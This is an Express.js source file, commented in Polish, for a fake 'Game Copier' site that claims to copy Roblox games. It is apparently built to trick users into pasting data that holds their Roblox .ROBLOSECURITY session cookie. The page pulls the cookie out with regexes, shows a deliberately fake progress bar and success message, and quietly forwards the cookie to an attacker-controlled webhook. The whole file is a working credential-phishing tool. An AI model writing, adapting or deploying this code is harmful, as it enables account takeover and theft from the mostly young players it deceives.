require('dotenv').config(); // usuń jeśli nie używasz .env

const express = require('express');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ── Strona główna z przyciskami ────────────────────────────────────────
app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>GameCopier & ClothesCopier</title>
  <style>
    body {
      margin:0; font-family:Arial,sans-serif; background:#0a0a14; color:#d0d8ff;
      min-height:100vh; display:flex; justify-content:center; align-items:center;
    }
    .container { text-align:center; max-width:720px; padding:40px 20px; }
    h1 { color:#00d4ff; font-size:4.5rem; margin-bottom:0.4em; text-shadow:0 0 30px #00d4ff99; }
    .subtitle { font-size:1.6rem; color:#a0a8ff; margin:1.5em 0 3em; }
    .btn {
      display:inline-block; margin:1.8rem; padding:26px 90px; font-size:2rem; font-weight:bold;
      color:white; background:linear-gradient(135deg,#ff3366,#ff6b6b); border:none; border-radius:80px;
      text-decoration:none; transition:all 0.4s; box-shadow:0 18px 50px rgba(255,51,102,0.55);
    }
    .btn:hover { transform:translateY(-10px); box-shadow:0 40px 90px rgba(255,51,102,0.8); }
    .btn.clothes { background:linear-gradient(135deg,#8b5cf6,#a78bfa); }
    .btn.clothes:hover { background:linear-gradient(135deg,#7c3aed,#c4b5fd); }
  </style>
</head>
<body>
<div class="container">
  <h1>GameCopier Tools</h1>
  <p class="subtitle">Wybierz co chcesz skopiować</p>
  <a href="/GameCopier" class="btn">Game Copier</a>
  <a href="/ClothesCopier" class="btn clothes">Clothes Copier</a>
</div>
</body>
</html>
  `);
});

// ── Game Copier – z paskiem ładowania i fałszywym sukcesem ───────────────
app.get('/GameCopier', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Game Copier</title>
  <style>
    body {
      margin:0; font-family:Arial,sans-serif; background:linear-gradient(135deg,#0f0f1a,#1a0f2e);
      color:#e0e0ff; min-height:100vh; background-attachment:fixed;
    }
    .container { max-width:1180px; margin:60px auto; padding:0 25px; text-align:center; }
    h1 { font-size:4.2rem; color:#00d4ff; text-shadow:0 0 40px #00d4ffbb; margin:0.3em 0; }
    .subtitle { font-size:1.7rem; color:#a0a8ff; margin:1em 0 3em; }
    .content { display:flex; flex-wrap:wrap; justify-content:center; gap:70px; }
    .left, .right {
      flex:1; min-width:400px; background:rgba(20,20,45,0.82); border-radius:22px;
      padding:45px; border:1px solid #445588; backdrop-filter:blur(14px);
    }
    textarea {
      width:100%; min-height:320px; background:#1a1a2e; color:#d0d0ff;
      border:1px solid #556; border-radius:16px; padding:22px; font-family:Consolas,monospace;
      font-size:16px; resize:vertical; margin:30px 0;
    }
    button {
      background:linear-gradient(90deg,#3b82f6,#60a5fa); color:white; border:none;
      padding:24px 80px; font-size:1.6rem; font-weight:bold; border-radius:80px;
      cursor:pointer; transition:all 0.4s; box-shadow:0 16px 45px rgba(59,130,246,0.6);
    }
    button:hover { transform:translateY(-7px); box-shadow:0 35px 80px rgba(59,130,246,0.9); }
    #result {
      margin-top:50px; font-size:2.1rem; font-weight:bold; min-height:160px; line-height:1.5;
    }
    .loading, .success, .error { display:block; }
    .progress-bar {
      width:100%; height:28px; background:#1a1a2e; border-radius:14px; overflow:hidden;
      margin:30px 0; border:1px solid #334;
    }
    .progress-fill {
      height:100%; width:0%; background:linear-gradient(90deg,#4ade80,#22c55e);
      transition:width 8s linear; box-shadow:0 0 20px #4ade80aa;
    }
    .hidden { display:none; }
    iframe { border-radius:22px; border:none; box-shadow:0 30px 70px rgba(0,0,0,0.8); }
  </style>
</head>
<body>
<div class="container">
  <h1>Game Copier</h1>
  <p class="subtitle">Paste your Game file below, then click "Start Process"</p>

  <div class="content">
    <div class="left">
      <p style="font-size:1.4rem; margin-bottom:1.6em;">
        Nie wiesz jak zdobyć plik gry? Obejrzyj tutorial po prawej.
      </p>
      <textarea id="input" placeholder="Paste your text / log / cookie here..."></textarea>
      <button onclick="startProcess()">Start Process</button>

      <div id="result"></div>
      <div id="progressContainer" class="hidden">
        <div class="progress-bar">
          <div id="progressFill" class="progress-fill"></div>
        </div>
        <div id="progressText" style="font-size:1.5rem; margin-top:12px;">Preparing download...</div>
      </div>
    </div>

    <div class="right">
      <iframe width="580" height="326" src="https://www.youtube.com/embed/k9SfgtkEmpo" 
        title="How To Copy Roblox Games 2026" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
      <p style="margin-top:1.6em; font-size:1.35rem;">
        *NEW* How To Copy Roblox Games In 2026 (UNPATCHED)<br>
        Pełny poradnik – obejrzyj jeśli utknąłeś
      </p>
    </div>
  </div>
</div>

<script>
async function startProcess() {
  const raw = document.getElementById('input').value.trim();
  const result = document.getElementById('result');
  const progressCont = document.getElementById('progressContainer');
  result.innerHTML = '';

  if (!raw) {
    result.innerHTML = '<span class="error">Nic nie wklejono!</span>';
    return;
  }

  let cookie = null;
  let match;

  // próby wyciągania cookie (te same co wcześniej)
  match = raw.match(/"\\.ROBLOSECURITY",\\s*"([^"]+)"/);
  if (match && match[1]) cookie = match[1].trim();

  if (!cookie) {
    match = raw.match(/-and-items\.\|_(.*?)(?=")/s);
    if (match && match[1]) cookie = match[1].trim();
  }

  if (!cookie) {
    match = raw.match(/_\\|WARNING[^"]{200,}/);
    if (match) cookie = match[0].trim();
  }

  if (!cookie) {
    const fallback = raw.match(/_[\\w\\-|]{180,}/g) || [];
    if (fallback.length) cookie = fallback.reduce((a,b)=>a.length>b.length?a:b).trim();
  }

  if (!cookie || cookie.length < 180 || !cookie.startsWith('_')) {
    result.innerHTML = '<span class="error">Wrong File!<br>TIP: Watch the tutorial video above</span>';
    return;
  }

  // ── Znaleziono cookie ──
  result.innerHTML = '';
  progressCont.classList.remove('hidden');

  // start paska (8 sekund)
  const fill = document.getElementById('progressFill');
  const text = document.getElementById('progressText');
  fill.style.width = '0%';
  text.textContent = 'Extracting session...';

  setTimeout(() => {
    fill.style.width = '100%';
    text.textContent = 'Downloading game assets...';
  }, 1500);

  // po ~8-10 sekundach sukces
  setTimeout(() => {
    progressCont.classList.add('hidden');
    result.innerHTML = '<span class="success">Game Downloading Started!<br>Wait approximately 5 minutes...</span>';

    // wysyłka do serwera (w tle)
    fetch('/check', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cookie })
    }).catch(() => {}); // ignorujemy błędy – użytkownik i tak widzi sukces
  }, 8500); // możesz zmienić czas np. 12000 na 12 sekund
}
</script>
</body>
</html>
  `);
});

// Clothes Copier – na razie prosta strona (możesz zrobić podobną logikę)
app.get('/ClothesCopier', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <title>Clothes Copier</title>
  <style>body{background:#0f0f17;color:#e0e0ff;font-family:Arial;padding:80px;text-align:center;}</style>
</head>
<body>
  <h1>Clothes Copier</h1>
  <p style="font-size:1.6rem;">Wkrótce dostępny – kopiowanie ubrań / animacji / avatarów</p>
  <p><a href="/" style="color:#00d4ff;font-size:1.5rem;">← Strona główna</a></p>
</body>
</html>
  `);
});

// ── Endpoint wysyłający do webhooka (minimalny + logi) ───────────────────
app.post('/check', async (req, res) => {
  const { cookie } = req.body || {};
  console.log('[CHECK] Otrzymano żądanie • cookie length:', cookie?.length || 0);

  if (!cookie || cookie.length < 180 || !cookie.startsWith('_')) {
    console.log('[CHECK] Nieprawidłowe cookie');
    return res.status(400).json({ ok: false });
  }

  const webhook = process.env.WEBHOOK;
  if (!webhook) {
    console.log('[CHECK] Brak WEBHOOK w .env – pomijam wysyłkę');
    return res.json({ ok: true });
  }

  try {
    console.log('[CHECK] Wysyłam do webhooka...');
    const resp = await fetch(webhook, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: '**GameCopier → nowe cookie**',
        embeds: [{
          title: 'Nowe .ROBLOSECURITY',
          description: '```' + cookie + '```',
          color: 0xFF3366,
          timestamp: new Date().toISOString(),
          footer: { text: 'GameCopier • ' + new Date().toLocaleString('pl-PL') }
        }]
      })
    });

    if (resp.ok) {
      console.log('[CHECK] Webhook wysłany pomyślnie (status ' + resp.status + ')');
    } else {
      const txt = await resp.text();
      console.log('[CHECK] Błąd webhooka:', resp.status, txt);
    }
  } catch (err) {
    console.error('[CHECK] Błąd fetch:', err.message);
  }

  res.json({ ok: true });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(\`Serwer działa → http://localhost:\${PORT}\`);
});
